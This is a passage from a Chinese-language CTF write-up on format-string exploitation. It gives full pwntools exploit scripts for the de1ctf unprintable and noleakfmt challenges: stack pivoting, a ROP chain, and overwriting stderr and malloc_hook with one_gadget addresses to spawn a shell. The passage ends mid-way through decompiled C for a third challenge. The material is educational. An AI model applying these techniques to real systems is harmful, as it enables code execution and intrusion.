rop</code></pre><p>修改完成后如下</p><p><a href="https://imgchr.com/i/BvZAiT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZAiT.png" alt="BvZAiT.png"></a></p><p>返回地址已经被修改为了pop rsp，rop链地址也修改完了</p><p>顺便说一下0008处的地址为什么是0x601248，我们设置的rop链存放的位置是0x601060，相对于buf的起始地址为0x200，而pop rsp的完整指令如下<code>0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code>，除了将0x601248 pop到rsp，还要pop三个值到三个寄存器中，所以我们pop到rsp的地址需要相对于存放rop链的地址往高处空出3*8个字节，留给r13，r14和r15。</p><p>完整exp如下(来自于<a href="https://www.anquanke.com/post/id/221267#h3-4" target="_blank" rel="noopener">四道题看格串新的利用方式</a>)</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./de1ctf_2019_unprintable"</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获取stack地址，并计算出要修改的地址</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x110</span><span class="token operator">-</span><span class="token number">8</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#劫持l_addr，从而在buf中伪造fini_array，再一次读并输出格式化字符串</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0x298</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%26$hn"</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007A3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pop_rsp <span class="token operator">=</span> <span class="token number">0x000000000040082d</span>csu_pop <span class="token operator">=</span> <span class="token number">0x000000000040082A</span>csu_call <span class="token operator">=</span> <span class="token number">0x0000000000400810</span>stderr_ptr_addr <span class="token operator">=</span> <span class="token number">0x0000000000601040</span>stdout_ptr_addr <span class="token operator">=</span> <span class="token number">0x0000000000601020</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> one_gadget <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>adc_p_rbp_edx <span class="token operator">=</span> <span class="token number">0x00000000004006E8</span>rop_addr <span class="token operator">=</span> <span class="token number">0x0000000000601260</span>tmp <span class="token operator">=</span> stderr_ptr_addr<span class="token number">-0x48</span><span class="token comment" spellcheck="true">#利用adc将stderr修改为one_gadget</span>rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_pop<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>tmp<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbx</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbp</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">-</span> tmp <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">0x10000000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r12</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">0x10000000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r13</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>adc_p_rbp_edx<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r14</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r15</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_call<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#call onegadget</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_pop<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbx</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbp</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stderr_ptr_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r12</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r13</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r14</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r15</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_call<span class="token punctuation">)</span>rop_addr <span class="token operator">=</span> rop_addr<span class="token number">-0x18</span>addr1 <span class="token operator">=</span> rop_addr<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token operator">+</span><span class="token number">0x10000</span>addr2 <span class="token operator">=</span> <span class="token punctuation">(</span>rop_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token operator">+</span><span class="token number">0x10000</span>addr3 <span class="token operator">=</span> <span class="token punctuation">(</span>rop_addr<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token operator">+</span><span class="token number">0x10000</span><span class="token comment" spellcheck="true">#0 劫持printf的返回地址，并将指针指向返回地址的下一地址，方便后面迁栈</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1-2为迁栈过程，即不断劫持printf的返回地址，并依次将下一地址修改为指向buf上存放rop串处，并且最终将返回地址改为pop rsp，从而执行rop串</span><span class="token comment" spellcheck="true">#1 </span>stack <span class="token operator">=</span> stack<span class="token operator">+</span><span class="token number">2</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span>tmp1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span>tmp2 <span class="token operator">=</span> tmp1<span class="token operator">+</span><span class="token number">0xa3</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>addr1<span class="token operator">-</span>tmp2<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hn'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>stack <span class="token operator">=</span> stack<span class="token operator">+</span><span class="token number">2</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token operator">-</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span>tmp1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3 继续将返回地址的下一地址修改为指向buf上存放rop串处，并且最终将返回地址改为pop rsp，从而执行rop串</span>payload <span class="token operator">=</span> <span class="token string">'%13$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>pop_rsp<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hn'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> rop<span class="token comment" spellcheck="true">#gdb.attach(p,'b *0x4007C1')</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#重新获取shell，并恢复stderr</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"sh >&amp;2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里再说一下rop链的构造</p><pre class=" language-python"><code class="language-python">rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_pop<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>tmp<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbx</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rbp</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">-</span> tmp <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">0x10000000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r12</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">0x10000000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r13</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>adc_p_rbp_edx<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r14</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r15</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_call<span class="token punctuation">)</span></code></pre><p>其实我一开始不太明白<code>rbx</code>为什么要设置为<code>stderr_ptr_addr-0x48-1</code>，还有<code>r12</code>和<code>r13</code>的设置，动调加思考之后才明白。<br>由于在csu中最终要调用这条指令</p><pre class=" language-assembly"><code class="language-assembly">call    qword ptr [r12+rbx*8]</code></pre><p>而我们要利用这条指令调用<code>0x4006E8</code>处的指令，因此[r12+rbx*8]需要为<code>0x4006E8</code>。我们的rop链的起始存储地址为0x601260，向下依次+8字节地址，<code>adc_p_rbp_edx</code>这条gadget存储在<code>0x601088</code>的位置。</p><p><code>r12+rbx*8</code>=<code>rop_addr + 0x8 * 6 - tmp * 8+8*(tmp-1)</code>=<code>0x601260+0x30-0x600ff8*8+8\*0x600ff7</code>,从数学计算上来看这个式子确实等于0x601088，但这是因为我们自动将其化简得来的，在计算机中则会先计算<code>rop_addr + 0x8 * 6 - tmp * 8</code>这个式子，就会得到一个负数，在计算机中负数是以补码表示的，会算得这个结果<code>FFFF FFFF FD5F 92D0</code>，因此我们加上0x10000000000000000把前面的ff给去掉。至于r13，会被pop到rdx，<code>offset = one_gadget - libc.sym['_IO_2_1_stderr_']</code>是一个负数，同样需要<code>+0x10000000000000000</code>来把前面的ff清0.</p><p>这题就到此为止，受益良多的一题</p><h2 id="0x3-西湖论剑-noleakfmt"><a href="#0x3-西湖论剑-noleakfmt" class="headerlink" title="0x3.西湖论剑-noleakfmt"></a>0x3.西湖论剑-noleakfmt</h2><p>这题在某种程度上又可以看成上一题的升级版</p><p>检查保护</p><p><a href="https://imgchr.com/i/Bg3Ac4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/Bg3Ac4.jpg" alt="Bg3Ac4.jpg"></a></p><p>IDA分析</p><p><a href="https://imgchr.com/i/Bgy9sI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/Bgy9sI.jpg" alt="Bgy9sI.jpg"></a></p><p>这题和上一题的区别在于没有stderr，但可以无限输入。</p><p>由于没有stderr，所以我们不能像上一题那样直接改stderr为onegadget，我们要使程序能够重新输出以获得libc，因此需要修改<code>_IO_2_1_stdout</code>结构体中的fileno成员为2，然后就能重新输出，之后再修改malloc_hook的值为onegadget，通过输入大量字符来触发onegadget。</p><p>在printf函数栈的上方存在着<code>_IO_2_1_stdout</code>的地址，我们可以通过抬栈使<code>_IO_2_1_stdout</code>落到printf函数栈中</p><p>在libc_start_main函数中有如下指令</p><pre class=" language-assembly"><code class="language-assembly">0x00007ffff7a2d750 <+0>:    push   r140x00007ffff7a2d752 <+2>:    push   r130x00007ffff7a2d754 <+4>:    push   r120x00007ffff7a2d756 <+6>:    push   rbp0x00007ffff7a2d757 <+7>:    mov    rbp,rcx0x00007ffff7a2d75a <+10>:    push   rbx0x00007ffff7a2d75b <+11>:    sub    rsp,0x90</code></pre><p>可以将栈抬高0x90</p><p><a href="https://imgchr.com/i/B20fQ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/05/B20fQ1.jpg" alt="B20fQ1.jpg"></a></p><p>抬高0x90之后的printf函数栈空间是能够包含<code>_IO_2_1_stdout</code>的，两者栈的距离小于0x90</p><p>确定好目标之后我们要来修改printf的返回地址了，由于__libc_start_mian函数存在于start函数的调用链中，所以我们可以将返回地址修改为start函数。</p><p>首先像上面两题一样，我们先修改栈链，使得可以通过格式化字符串修改返回地址，将返回地址修改为start，由于start地址为0x7b0，我们一次写入两字节，会把倒数第四位清0，开启了pie，所以有1/16的几率修改成功。成功修改返回地址为start之后就会抬栈，接下来再故技重施，修改栈链，并且将stdout地址的后两位修改为0x90，从而修改fileno成员，使stdout重新输出，然后再修改malloc_hook为onegadget就好，再通过printf输出大量字符来触发onegadget就行(不想写了，后续利用和上一题一样的方式，阿巴阿巴阿巴)，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./noleakfmt'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>start<span class="token operator">=</span><span class="token number">0x7b0</span>onegadget<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gift : 0x"</span><span class="token punctuation">)</span>    stack<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%11$hn'</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%37$hn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>       <span class="token keyword">except</span> <span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token number">-0x54</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%10$hn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%36$hhn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%26$hhn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%9$p'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>        libc_base<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">240</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        malloc_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>malloc_hook<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%36$hn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%26$hn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%36$hhn'</span>        <span class="token comment" spellcheck="true">#gdb.attach(io)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%26$hhn'</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%99999c'</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'exec 1>&amp;2'</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./noleakfmt'</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0364 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1207 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL  '''</span></code></pre><p>接下来再来道偏一点的格式化字符串知识点利用</p><h2 id="0x4-网鼎杯白虎组-quantum-entanglement"><a href="#0x4-网鼎杯白虎组-quantum-entanglement" class="headerlink" title="0x4.网鼎杯白虎组-quantum_entanglement"></a>0x4.网鼎杯白虎组-quantum_entanglement</h2><p>检查保护</p><p><a href="https://imgchr.com/i/BTTvJx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BTTvJx.png" alt="BTTvJx.png"></a></p><p>IDA分析</p><p>然而有问题</p><p><a href="https://imgchr.com/i/BT71Ts" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BT71Ts.png" alt="BT71Ts.png"></a></p><p>看到0x8048998</p><p><a href="https://imgchr.com/i/BT7Jf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BT7Jf0.png" alt="BT7Jf0.png"></a></p><p>scanf函数，f5看看scanf反编译成什么样了</p><p><a href="https://imgchr.com/i/BT7NlT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BT7NlT.png" alt="BT7NlT.png"></a></p><p>龟龟，怎么这么多参数，不对劲，按y改一下参数</p><p><a href="https://imgchr.com/i/BT7fne" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BT7fne.png" alt="BT7fne.png"></a></p><p>改完之后就能反编译main了</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-ECh]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-E8h]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-E4h]</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-E0h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-DCh]</span>  <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-D4h]</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+E0h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 